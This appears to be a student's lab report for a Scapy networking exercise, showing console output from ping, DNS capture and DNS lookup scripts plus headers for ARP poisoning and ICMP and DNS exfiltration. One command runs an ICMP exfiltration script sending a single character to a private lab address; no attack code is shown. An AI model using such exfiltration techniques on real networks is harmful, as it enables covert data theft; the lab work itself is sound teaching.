# TP

## 1.Getting started Scapy

**🌞 ping.py**

    PS C:\Users\eloua\B2-R-seau> .\TP-4\ping.py
    Begin emission

    Finished sending 1 packets
    ...................................................................................
    Received 83 packets, got 0 answers, remaining 1 packets
    Begin emission

**🌞 dns_cap.py**

    $ sudo python3 dns_cap.py
    104.26.11.233 ; 172.67.74.226 ; 104.26.10.233 ;
    
#
    PS C:\Users\eloua\B2-R-seau> nslookup ynov.com
    Serveur :   UnKnown
    Address:  fe80::aafb:40ff:fed3:8eb0

    Réponse ne faisant pas autorité :
    Nom :    ynov.com
    Addresses:  2606:4700:20::681a:ae9
            2606:4700:20::681a:be9
            2606:4700:20::ac43:4ae2
            104.26.10.233
            172.67.74.226
            104.26.11.233

**🌞 dns_lookup.py**

    PS C:\Users\eloua\B2-R-seau> .\TP-4\dns_lookup.py
    104.26.10.233 ; 104.26.11.233 ; 172.67.74.226 ;

## II. ARP Poisoning

## III. Exfiltration ICMP

**🌞 icmp_exf_send.py**

    PS C:\Users\eloua\B2-R-seau> .\TP-4\icmp_exf_send.py 192.168.56.1 t
        .
    Sent 1 packets.

## IV. Exfiltration DNS

**🌞 dns_exfiltration_send.py**